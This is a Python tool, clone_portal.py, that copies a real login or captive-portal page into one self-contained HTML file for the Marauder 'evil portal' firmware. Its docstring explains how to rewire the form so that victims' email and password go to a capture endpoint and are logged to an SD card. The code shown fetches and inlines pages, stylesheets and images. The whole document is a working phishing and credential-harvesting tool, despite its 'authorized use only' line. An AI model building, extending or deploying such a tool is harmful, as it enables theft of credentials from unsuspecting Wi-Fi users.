#!/usr/bin/env python3
"""
clone_portal.py -- clone a target captive/landing page into a Marauder-ready portal.

Runs on your COMPUTER (not the board). Point it at the real page you're
authorized to mimic; it fetches the HTML, pulls in the linked resources
(CSS, images, favicon), inlines them into ONE self-contained file, rewires the
login form to Marauder's capture endpoint, minifies, and enforces Marauder's
size ceiling. The result is an `index.html` you drop on the board's SD card.

Marauder evil-portal contract (firmware v1.13.0), which this tool targets exactly:
  * ONE self-contained index.html on the SD-card root -- no external CSS/JS/img.
  * ~20 KB hard size budget (Marauder rejects/breaks on larger pages).
  * Marauder redirects every request to the portal, so remote resource URLs do
    NOT load on the twin -- everything the page needs must be inlined.
  * Credentials are captured from  <form method="POST" action="/get">  where the
    inputs are named  email  and  password . They land in evil_portal_x.log on
    the SD card and stream over serial.

Because of the 20 KB budget + captive redirect, a literal pixel-perfect clone of
a heavy site usually will NOT fit. This tool inlines what it can, then trims
(JS -> fonts -> largest images) until it's under budget, and tells you exactly
what it dropped. Tune with the flags below.

  python3 clone_portal.py --url http://portal.example.com/login \
      --ssid "Corp-Guest" --out index.html

  # keep original JavaScript, allow a looser budget:
  python3 clone_portal.py --url http://1.2.3.4/ --keep-js --max-bytes 30000

AUTHORIZED USE ONLY. Cloning a login page to harvest credentials is legal only
against systems you own or have explicit written permission to test.
"""

import argparse
import base64
import re
import sys
from urllib.parse import urljoin, urlparse
from urllib.request import Request, urlopen

USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
MARAUDER_BUDGET = 20000  # bytes -- Marauder evil-portal single-file ceiling


def fetch(url, binary=False, timeout=15):
    """GET a URL. Returns (data, final_url, content_type). data is str unless binary."""
    req = Request(url, headers={"User-Agent": USER_AGENT})
    with urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
        final = resp.geturl()
        ctype = resp.headers.get("Content-Type", "")
    if binary:
        return raw, final, ctype
    charset = "utf-8"
    m = re.search(r"charset=([\w-]+)", ctype or "", re.I)
    if m:
        charset = m.group(1)
    return raw.decode(charset, errors="replace"), final, ctype


def guess_mime(url, ctype):
    if ctype and "/" in ctype:
        return ctype.split(";")[0].strip()
    ext = urlparse(url).path.lower().rsplit(".", 1)[-1] if "." in urlparse(url).path else ""
    return {
        "png": "image/png", "jpg": "image/jpeg", "jpeg": "image/jpeg",
        "gif": "image/gif", "svg": "image/svg+xml", "webp": "image/webp",
        "ico": "image/x-icon", "css": "text/css", "js": "application/javascript",
    }.get(ext, "application/octet-stream")


def to_data_uri(data, mime):
    return "data:{};base64,{}".format(mime, base64.b64encode(data).decode("ascii"))


class Cloner:
    def __init__(self, base_url, opts):
        self.base = base_url
        self.opts = opts
        self.dropped = []          # human-readable notes on what was trimmed
        self._img_cache = {}

    # -- resource inlining ------------------------------------------------
    def inline_image(self, ref, max_img=None):
        """Return a data: URI for an image ref, or None if it can't/shouldn't inline."""
        if ref.startswith("data:"):
            return ref
        url = urljoin(self.base, ref)
        if url in self._img_cache:
            return self._img_cache[url]
        try:
            data, final, ctype = fetch(url, binary=True)
        except Exception as e:
            self.dropped.append("image not fetched: {} ({})".format(ref, e))
            self._img_cache[url] = None
            return None
        cap = max_img if max_img is not None else self.opts.max_image
        if len(data) > cap:
            self.dropped.append("image too large, dropped: {} ({} B > {} B)".format(ref, len(data), cap))
            self._img_cache[url] = None
            return None
        uri = to_data_uri(data, guess_mime(url, ctype))
        self._img_cache[url] = uri
        return uri

    def inline_css_urls(self, css_text, css_base):
        """Inline small url(...) images referenced inside a stylesheet."""
        def repl(m):
            quote = m.group(1) or ""
            ref = m.group(2).strip()
            if ref.startswith("data:"):
                return m.group(0)
            abs_url = urljoin(css_base, ref)
            # skip fonts by default -- they blow the budget instantly
            if not self.opts.keep_fonts and re.search(r"\.(woff2?|ttf|otf|eot)(\?|$)", ref, re.I):
                self.dropped.append("font dropped from CSS: {}".format(ref))
                return "url()"
            uri = self.inline_image(abs_url, max_img=self.opts.max_css_image)
            if uri:
                return "url({}{}{})".format(quote, uri, quote)
            return "url()"
        return re.sub(r"url\(\s*(['\"]?)(.*?)\1\s*\)", repl, css_text)

    def fetch_stylesheets(self, html):
        """Pull <link rel=stylesheet> and inline them as <style> blocks."""
        styles = []
        for m in re.finditer(r'<link\b[^>]*rel=["\']?stylesheet["\']?[^>]*>', html, re.I):
            tag = m.group(0)
            href = re.search(r'href=["\']([^"\']+)["\']', tag, re.I)
            if not href:
                continue
            url = urljoin(self.base, href.group(1))
            try:
                css, final, _ = fetch(url)
            except Exception as e:
                self.dropped.append("stylesheet not fetched: {} ({})".format(href.group(1), e))
                continue
            css = self.inline_css_urls(css, final)
            styles.append(css)
        # strip the now-inlined <link> tags
        html = re.sub(r'<link\b[^>]*rel=["\']?stylesheet["\']?[^>]*>', "", html, flags=re.I)
        if styles:
            block = "<style>\n" + "\n".join(styles) + "\n</style>"
            if re.search(r"</head>", html, re.I):
                html = re.sub(r"</head>", block + "\n</head>", html, count=1, flags=re.I)
            else:
                html = block + html
        return html
